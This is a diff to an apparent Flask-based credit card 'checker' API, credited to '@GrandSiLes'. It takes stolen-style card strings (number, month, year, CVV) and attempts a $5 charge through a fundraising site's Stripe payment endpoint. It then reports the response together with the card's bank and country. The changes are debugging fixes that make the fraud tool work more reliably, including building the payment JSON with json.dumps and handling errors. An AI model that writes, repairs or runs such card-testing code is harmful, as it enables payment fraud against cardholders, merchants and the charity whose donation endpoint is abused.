@@ -1,12 +1,13 @@
 from flask import Flask, request, jsonify
 import requests
 import re
+import json
 
 app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return "Stripe Charge $5 API - Use /chk?lista=ccn|mm|yy|cvv"
+    return "Stripe Charge API - Use /chk?lista=ccn|mm|yy|cvv"
 
 @app.route('/chk')
 def check_card():
@@ -83,7 +84,7 @@ def check_card():
         
         if not pid:
             return jsonify({
-                "CC": f"{ccn}|{mm}|{yy[-2:] if len(yy) == 4 else yy}|{cvv}",
+                "CC": f"{ccn}|{mm}|{yy[-2:]}|{cvv}",
                 "Response": apx,
                 "Gateway": "Stripe Charge $5",
                 "Bank": bin_info.get('bank', 'N/A'),
@@ -95,7 +96,7 @@ def check_card():
                 "Author": "@GrandSiLes"
             })
         
-        # Second Request - Process payment
+        # Second Request - Process payment (FIXED VERSION)
         headers2 = {
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
@@ -114,13 +115,77 @@ def check_card():
             'x-fru-embed-version': '251114-1326',
         }
 
-        data2 = f'{{"paymentMethod":{{"id":"{pid}","object":"payment_method","allow_redisplay":"unspecified","billing_details":{{"address":{{"city":null,"country":null,"line1":null,"line2":null,"postal_code":null,"state":null}},"email":null,"name":null,"phone":null,"tax_id":null}},"card":{{"brand":"visa","brand_product":null,"checks":{{"address_line1_check":null,"address_postal_code_check":null,"cvc_check":null}},"country":"US","display_brand":"visa","exp_month":{mm},"exp_year":{yy},"funding":"debit","generated_from":null,"last4":"{ccn[-4:]}","networks":{{"available":["visa"],"preferred":null}},"regulated_status":"unregulated","three_d_secure_usage":{{"supported":true}},"wallet":null}},"created":1763132239,"customer":null,"livemode":true,"radar_options":{{}},"type":"card"}}}}'
+        # FIXED: Proper JSON construction using json.dumps instead of f-string
+        payment_data = {
+            "paymentMethod": {
+                "id": pid,
+                "object": "payment_method",
+                "allow_redisplay": "unspecified",
+                "billing_details": {
+                    "address": {
+                        "city": None,
+                        "country": None,
+                        "line1": None,
+                        "line2": None,
+                        "postal_code": None,
+                        "state": None
+                    },
+                    "email": None,
+                    "name": None,
+                    "phone": None,
+                    "tax_id": None
+                },
+                "card": {
+                    "brand": "visa",
+                    "brand_product": None,
+                    "checks": {
+                        "address_line1_check": None,
+                        "address_postal_code_check": None,
+                        "cvc_check": None
+                    },
+                    "country": "US",
+                    "display_brand": "visa",
+                    "exp_month": int(mm),
+                    "exp_year": int(yy),
+                    "funding": "debit",
+                    "generated_from": None,
+                    "last4": ccn[-4:],
+                    "networks": {
+                        "available": ["visa"],
+                        "preferred": None
+                    },
+                    "regulated_status": "unregulated",
+                    "three_d_secure_usage": {
+                        "supported": True
+                    },
+                    "wallet": None
+                },
+                "created": 1763132239,
+                "customer": None,
+                "livemode": True,
+                "radar_options": {},
+                "type": "card"
+            }
+        }
 
-        response2 = requests.post('https://api.fundraiseup.com/paymentSession/7224428805057036011/pay', headers=headers2, data=data2, timeout=30)
+        data2 = json.dumps(payment_data)
+        
+        response2 = requests.post(
+            'https://api.fundraiseup.com/paymentSession/7224428805057036011/pay', 
+            headers=headers2, 
+            data=data2, 
+            timeout=30
+        )
+        
+        # Try to parse JSON response, if fails return text
+        try:
+            response_json = response2.json()
+        except:
+            response_json = {"raw_response": response2.text}
         
         return jsonify({
-            "CC": f"{ccn}|{mm}|{yy[-2:] if len(yy) == 4 else yy}|{cvv}",
-            "Response": response2.json(),
+            "CC": f"{ccn}|{mm}|{yy[-2:]}|{cvv}",
+            "Response": response_json,
             "Gateway": "Stripe Charge $5",
             "Bank": bin_info.get('bank', 'N/A'),
             "Country": bin_info.get('country_name', 'N/A'),
@@ -133,7 +198,7 @@ def check_card():
         
     except Exception as e:
         return jsonify({
-            "CC": f"{ccn}|{mm}|{yy[-2:] if len(yy) == 4 else yy}|{cvv}",
+            "CC": f"{ccn}|{mm}|{yy[-2:]}|{cvv}",
             "Response": {"error": str(e)},
             "Gateway": "Stripe Charge $5",
             "Bank": bin_info.get('bank', 'N/A'),
